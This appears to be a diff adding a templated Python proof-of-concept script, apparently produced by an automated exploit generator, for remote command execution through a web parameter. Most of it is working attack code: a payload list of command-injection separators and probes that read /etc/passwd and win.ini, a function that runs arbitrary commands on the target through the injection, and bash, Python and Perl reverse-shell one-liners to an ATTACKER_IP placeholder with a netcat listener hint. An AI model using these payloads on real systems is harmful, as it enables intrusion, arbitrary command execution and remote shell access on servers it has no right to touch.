@@ -1,0 +1,146 @@
+#!/usr/bin/env python3
+"""
+远程命令执行 POC
+自动生成 by DeepSec POCGenerator
+漏洞类型: {{ vuln_type }}
+目标: {{ target_url }}
+参数: {{ parameter }}
+"""
+import requests
+import sys
+import urllib.parse
+import re
+
+TARGET = "{{ target_url }}"
+PARAMETER = "{{ parameter }}"
+PAYLOAD = "{{ payload }}"
+METHOD = "{{ method }}"
+COOKIE = "{{ cookie }}"
+
+# --- RCE payload 列表 ---
+RCE_PAYLOADS = [
+    # Linux
+    ["id", "uid="],
+    ["whoami", ""],
+    ["uname -a", "Linux"],
+    ["cat /etc/passwd", "root:"],
+    ["ls -la /", "bin"],
+    ["cat /proc/version", "Linux version"],
+
+    # Windows
+    ["whoami", ""],
+    ["ver", "Microsoft"],
+    ["dir C:\\", "<DIR>"],
+    ["type C:\\Windows\\win.ini", "[extensions]"],
+
+    # 命令分隔符变体
+    [";id", "uid="],
+    ["|id", "uid="],
+    ["&&id", "uid="],
+    ["`id`", "uid="],
+    ["$(id)", "uid="],
+    ["%0aid", "uid="],
+    ["%0Aid", "uid="],
+
+    # Python
+    ["__import__('os').system('id')", "uid="],
+    ["import os; os.system('id')", "uid="],
+]
+
+
+def send_payload(payload):
+    """发送 RCE payload 并返回响应。"""
+    params = {PARAMETER: payload}
+    headers = {"Cookie": COOKIE} if COOKIE else {}
+
+    if METHOD.upper() == "POST":
+        resp = requests.post(TARGET, data=params, headers=headers, timeout=10)
+    else:
+        resp = requests.get(TARGET, params=params, headers=headers, timeout=10)
+
+    return {
+        "status": resp.status_code,
+        "length": len(resp.text),
+        "text": resp.text,
+    }
+
+
+def check_rce():
+    """检测 RCE 漏洞。"""
+    for cmd, indicator in RCE_PAYLOADS:
+        for payload in [cmd, f";{cmd}", f"|{cmd}", f"&&{cmd}", f"`{cmd}`", f"$({cmd})"]:
+            resp = send_payload(payload)
+            if resp["status"] == 200 and indicator:
+                if indicator in resp["text"]:
+                    print(f"[+] RCE 确认: payload={payload}")
+                    return True, payload, resp["text"]
+            elif resp["status"] == 200 and not indicator:
+                # 无 indicator，检查响应是否有变化
+                normal = send_payload("test")
+                if resp["length"] != normal["length"] and resp["length"] > 0:
+                    print(f"[+] RCE 疑似: payload={payload} (长度变化)")
+                    return True, payload, resp["text"]
+    return False, "", ""
+
+
+def execute_command(command):
+    """通过 RCE 执行命令并返回输出。
+
+    Args:
+        command: 要执行的命令。
+
+    Returns:
+        命令输出字符串。
+    """
+    # 尝试多种注入方式
+    inject_patterns = [
+        f";{command}",
+        f"|{command}",
+        f"&&{command}",
+        f"`{command}`",
+        f"$({command})",
+        f"%0a{command}",
+    ]
+
+    for payload in inject_patterns:
+        resp = send_payload(payload)
+        if resp["status"] == 200 and len(resp["text"]) > 0:
+            return resp["text"]
+    return None
+
+
+def get_shell():
+    """尝试获取交互式 Shell。"""
+    # TODO: 实现 reverse shell
+    reverse_shell_payloads = [
+        # Bash
+        "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
+        # Python
+        "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));"
+        "[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
+        # Perl
+        "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=4444;"
+        "socket(S,2,1,0);connect(S,pack_sockaddr_in($p,inet_aton($i)));"
+        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh\")'",
+    ]
+
+    print("[*] Reverse shell 需要设置监听器:")
+    print("    nc -lvnp 4444")
+    print("[*] 替换 ATTACKER_IP 为你的 IP")
+    print("[*] 建议使用 --dangerous 模式自动执行")
+
+
+if __name__ == "__main__":
+    print(f"[*] RCE POC - {TARGET} param={PARAMETER}")
+    print(f"[*] 检测中...")
+
+    found, payload, output = check_rce()
+
+    if found:
+        print(f"\n[+] RCE 漏洞确认 @ {TARGET}")
+        print(f"[+] 参数: {PARAMETER}")
+        print(f"[+] 有效 payload: {payload}")
+        print(f"[+] 命令输出: {output[:500]}")
+        print(f"\n[*] 可执行任意命令")
+    else:
+        print("[-] 未检测到 RCE")
